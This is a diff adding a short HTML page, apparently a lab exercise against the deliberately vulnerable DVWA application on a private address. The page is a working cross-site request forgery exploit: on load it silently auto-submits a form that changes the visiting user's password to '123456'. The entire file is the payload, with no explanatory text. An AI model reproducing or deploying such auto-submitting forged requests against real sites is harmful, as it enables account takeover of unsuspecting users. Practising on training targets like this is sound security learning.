@@ -1,0 +1,21 @@
+﻿<html>
+<body onload="setTimeout(function() { document.forms[0].submit(); }, 500);">
+<form enctype="application/x-www-form-urlencoded" method="GET" action="http://192.168.100.163/dvwa/vulnerabilities/csrf/">
+    <table>
+        <tr>
+            <td>password_new</td>
+            <td><input type="text" value="123456" name="password_new"></td>
+        </tr>
+        <tr>
+            <td>password_conf</td>
+            <td><input type="text" value="123456" name="password_conf"></td>
+        </tr>
+        <tr>
+            <td>Change</td>
+            <td><input type="text" value="Change" name="Change"></td>
+        </tr>
+    </table>
+    <input type="submit" value="http://192.168.100.163/dvwa/vulnerabilities/csrf/">
+</form>
+</body>
+</html>
